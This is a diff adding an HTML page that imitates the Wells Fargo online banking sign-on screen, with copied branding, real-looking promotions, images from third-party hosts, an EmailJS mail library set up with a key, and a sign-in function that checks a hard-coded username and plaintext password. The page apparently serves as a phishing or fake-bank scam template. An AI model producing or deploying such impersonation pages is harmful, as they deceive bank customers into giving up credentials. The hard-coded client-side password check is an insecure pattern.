@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wells Fargo Online Banking</title>
+    <link rel="stylesheet" href="Css/styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+</head> <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wells Fargo Online Banking</title>
+    <link rel="icon" href="https://i.ibb.co/tTP89Pq1/downloadz.jpg" type="image/jpeg">
+    <link rel="stylesheet" href="Css/styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+</head>
+
+<body><a href="dashboard.html"></a>
+    <header>
+        <nav class="navbar">
+            <div class="logo">WELLS FARGO</div>
+            <button class="menu-toggle" aria-label="Toggle menu">
+                <span class="hamburger-icon"></span>
+            </button>
+            <ul class="nav-links">
+                <li><a href="#">Personal</a></li>
+                <li><a href="https://www.wellsfargo.com/investing-wealth/">Investing & Wealth Management</a></li>
+                <li><a href="https://www.wellsfargo.com/biz/">Small Business</a></li>
+                <li><a href="https://www.wellsfargo.com/com/">Commercial Banking</a></li>
+                <li><a href="https://www.wellsfargo.com/cib/">Corporate & Investment Banking</a></li>
+                <li><button class="nav-sign-on">Sign On</button></li>
+            </ul>
+        </nav>
+    </header>
+
+    <div class="main-content">
+        <div class="login-container">
+            <div class="login-box">
+                <h1>Welcome to Online Banking</h1>
+                <p class="subtitle">Sign on to manage your accounts.</p>
+
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" name="username" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <div class="password-input">
+                        <input type="password" id="password" name="password" required>
+                        <button type="button" class="show-password" onclick="togglePassword()">Show</button>
+                    </div>
+                </div>
+
+                <div class="remember-me">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">Save username</label>
+                </div>
+
+                <button type="button" class="sign-in-btn" onclick="signIn()">Sign On</button>
+
+                <a href="#" class="forgot-link">Forgot username or password?</a>
+            </div>
+
+            <div class="promo-box">
+                <div class="promo-content">
+                    <h2>$300 checking bonus</h2>
+                    <h3>on us</h3>
+                    <p>New customers open an eligible checking account with qualifying direct deposits</p>
+                    <button class="get-started-btn">Get started <span class="arrow">›</span></button>
+                </div>
+            </div>
+        </div>
+
+        <section class="financial-guidance">
+            <h2>Financial guidance and support</h2>
+            <div class="guidance-cards">
+                <div class="guidance-card">
+                    <img src="https://www17.wellsfargomedia.com/assets/images/contextual/responsive/smlpromo/wfi000_ph_g_1305630454_616x353.jpg" alt="Financial Planning">
+                    <div class="card-content">
+                        <h3>Reimagine. Navigate. Move forward.</h3>
+                        <p>Discover steps that may help you manage life-changing events</p>
+                        <button class="guidance-btn">Manage life events</button>
+                    </div>
+                </div>
+
+                <div class="guidance-card">
+                    <img src="https://i.ibb.co/xSRJzDyM/w2.jpg" alt="Paze Security">
+                    <div class="card-content">
+                        <h3>Paze<sup>SM</sup> offers added security</h3>
+                        <p>A convenient way to use your eligible Wells Fargo cards at select merchants</p>
+                        <button class="guidance-btn">Learn more</button>
+                    </div>
+                </div>
+
+                <div class="guidance-card">
+                    <img src="https://i.ibb.co/jZx365vg/w3.jpg" alt="Digital Tools">
+                    <div class="card-content">
+                        <h3>Get tools. Get tips. Get peace of mind.</h3>
+                        <p>Discover digital tools to help you budget, save, manage credit, and more</p>
+                        <button class="guidance-btn">Access the toolkit</button>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <section class="business-finance">
+        <div class="business-container">
+            <div class="business-text">
+                <h4>SIMPLIFY YOUR BUSINESS FINANCES</h4>
+                <h2>Only the best for your business</h2>
+                <p>
+                    Earn unlimited rewards—travel or cash—with every card. Explore banking options that can help move your business forward.
+                </p>
+                <a href="#" class="business-link">Explore business solutions ›</a>
+            </div>
+            <div class="business-image">
+                <img src="https://ecm.capitalone.com/WCM/homepage/testing/checkered-component/2024/digital-205-topic-selector-12-12/tab-1-e4.c-item-2-desktop.jpg" alt="Business Finance">
+            </div>
+        </div>
+    </section>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        emailjs.init('ln9QoCi6n5ovuHf-L');
+    </script>
+    <script src="Css/Js/script.js"></script>
+    <script>
+        function signIn() {
+            // Get the values of username and password
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+    
+            // Replace 'admin' and 'password123' with your actual login credentials
+            if (username === "pablo" && password === "softwork2019") {
+                // Redirect to dashboard.html upon successful login
+                window.location.href = "dashboard.html";
+            } else {
+                alert("Invalid username or password. Please try again.");
+            }
+        }
+    </script>
+    
+</body>
+</html>
